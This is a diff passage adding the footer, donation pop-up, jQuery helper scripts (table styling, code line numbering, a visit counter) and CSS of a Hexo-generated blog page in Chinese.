+    ©2023-2026 Secfeng
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+<div class="hide_box" onclick="dashangToggle()"></div>
+<div class="shang_box">
+    <a class="shang_close"  onclick="dashangToggle()">×</a>
+    <div class="shang_tit">
+        <p>喜欢就点赞,疼爱就打赏</p>
+    </div>
+    <div class="shang_payimg">
+        <div class="pay_img">
+            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
+            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
+        </div>
+    </div>
+    <div class="shang_payselect">
+        <span><label><input type="radio" name="pay" checked value="alipay">支付宝</label></span><span><label><input type="radio" name="pay" value="weixin">微信</label></span>
+    </div>
+</div>
+
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+        $("input[name=pay]").on("click", function () {
+            if($("input[name=pay]:checked").val()=="weixin"){
+                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
+            } else {
+                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
+            }
+        })
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().trim().split('\n').length, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+    function dashangToggle() {
+        $(".shang_box").fadeToggle();
+        $(".hide_box").fadeToggle();
+    }
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 35px;
+    }
+    .pre-numbering{
+        margin: 0;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: ;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
